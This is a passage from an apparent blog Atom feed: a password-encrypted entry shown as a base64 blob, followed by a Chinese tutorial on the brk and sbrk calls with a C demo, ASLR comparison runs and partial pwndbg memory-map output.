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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="book" scheme="https://pz1o.top/tags/book/"/>
    
  </entry>
  
  <entry>
    <title>理解sbrk和brk</title>
    <link href="https://pz1o.top/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/"/>
    <id>https://pz1o.top/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/</id>
    <published>2021-04-17T08:12:11.000Z</published>
    <updated>2021-04-18T15:51:26.800Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-sbrk和brk函数原型"><a href="#0x01-sbrk和brk函数原型" class="headerlink" title="0x01 sbrk和brk函数原型"></a>0x01 sbrk和brk函数原型</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> *addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sbrk</span><span class="params">(<span class="keyword">intptr_t</span> increment)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>description:        </p><p>brk() and sbrk() change the location of the program break, which defines the end of the process’s data segment (i.e., the program break is the first location after the end of the uninitialized data segment).  Increasing the program break has the effect of allocating memory to the process; decreasing the break deallocates memory.</p><p>return value:</p><p>On success, brk() returns zero.  On error, -1 is returned, and errno is set to ENOMEM.</p><p>On success, sbrk() returns the previous program break.  (If the break was increased, then this value is a pointer to the start of the newly allocated memory).  On error, (void *) -1 is returned,and errno is set to ENOMEM.</p></blockquote><p>英文解释的很清楚了，主要理解什么是program break和data segment</p><ol><li>program break被定义为程序data segment的结束位置</li><li>data segment应该包含了data segment、bss segment和heap</li></ol><p>此外，我们还需要关注两个函数的返回值</p><ol><li>brk通过传递的addr来重新设置program break，成功则返回0，否则返回-1</li><li>sbrk用来增加heap，增加的大小通过参数increment决定，返回增加大小前的heap的program break，如果increment为0则返回program break。</li></ol><h1 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> bss_end;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span>* ret;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bss is %p\n"</span>,(<span class="keyword">char</span>*)(&amp;bss_end)+<span class="number">4</span>);</span><br><span class="line">ret = sbrk(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != (<span class="keyword">void</span>*)<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"start %p\n"</span>,ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ASLR开启结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pz1o$ ./a</span><br><span class="line">bss is 0x601048</span><br><span class="line">start 0x1056000</span><br><span class="line"> ~/Desktop/mydemo [04:52:59]</span><br><span class="line">pz1o$ ./a</span><br><span class="line">bss is 0x601048</span><br><span class="line">start 0xd28000</span><br><span class="line"> ~/Desktop/mydemo [04:52:59]</span><br><span class="line">pz1o$ ./a</span><br><span class="line">bss is 0x601048</span><br><span class="line">start 0x1f9a000</span><br></pre></td></tr></table></figure><p>不开启ASLR结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> ~/Desktop/mydemo [<span class="number">05</span>:<span class="number">04</span>:<span class="number">39</span>]</span><br><span class="line">pz1o$ ./a</span><br><span class="line">bss is <span class="number">0x601048</span></span><br><span class="line">start <span class="number">0x623000</span></span><br><span class="line"> ~/Desktop/mydemo [<span class="number">05</span>:<span class="number">04</span>:<span class="number">40</span>]</span><br><span class="line">pz1o$ ./a            </span><br><span class="line">bss is <span class="number">0x601048</span></span><br><span class="line">start <span class="number">0x623000</span></span><br><span class="line"> ~/Desktop/mydemo [<span class="number">05</span>:<span class="number">04</span>:<span class="number">43</span>]</span><br><span class="line">pz1o$ ./a</span><br><span class="line">bss is <span class="number">0x601048</span></span><br><span class="line">start <span class="number">0x623000</span></span><br></pre></td></tr></table></figure><p>可以看到在不开ASLR情况下，program break是不变的，当然另一种情况就是变化的</p><p>此外srbk返回的是堆结束的地址具体可以看gdb调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x600000</span>           <span class="number">0x601000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x601000</span>           <span class="number">0x602000</span> rw-p     <span class="number">1000</span> <span class="number">1000</span>   /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x602000</span>           <span class="number">0x623000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span 